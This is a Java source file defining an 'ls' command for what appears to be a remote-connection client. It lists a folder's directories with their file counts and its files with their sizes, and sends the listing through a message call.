package br.com.introcdc.connect.client.commands.file.navigation;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 16:12
 */

import br.com.introcdc.connect.client.command.ClientCommand;
import br.com.introcdc.connect.client.components.FileComponents;
import br.com.introcdc.connect.client.components.settings.FileInfo;
import oshi.util.FormatUtil;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class ClientCommandListFiles extends ClientCommand {

    public ClientCommandListFiles() {
        super("ls");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        File folder = new File(FileComponents.FOLDER);
        StringBuilder stringBuilder = new StringBuilder("> Pasta " + folder.getAbsolutePath());
        if (folder.listFiles() == null) {
            msg("Pasta inválida!");
            return;
        }
        List<FileInfo> directories = new ArrayList<>();
        List<FileInfo> files = new ArrayList<>();
        int index = 0;
        for (File file : folder.listFiles()) {
            if (file.isDirectory()) {
                directories.add(new FileInfo(file, index));
            } else {
                files.add(new FileInfo(file, index));
            }
            index++;
        }
        for (FileInfo directory : directories) {
            File[] fileSel = directory.getFile().listFiles();
            stringBuilder.append("\n/[").append(directory.getIndex()).append("] ").append(directory.getFile().getName()).append(" | ").append(fileSel != null ? fileSel.length : -1).append(" arquivos");
        }
        for (FileInfo file : files) {
            stringBuilder.append("\n[").append(file.getIndex()).append("] ").append(file.getFile().getName()).append(" | ").append(FormatUtil.formatBytes(file.getFile().length()));
        }
        msg(stringBuilder.toString());
    }

}
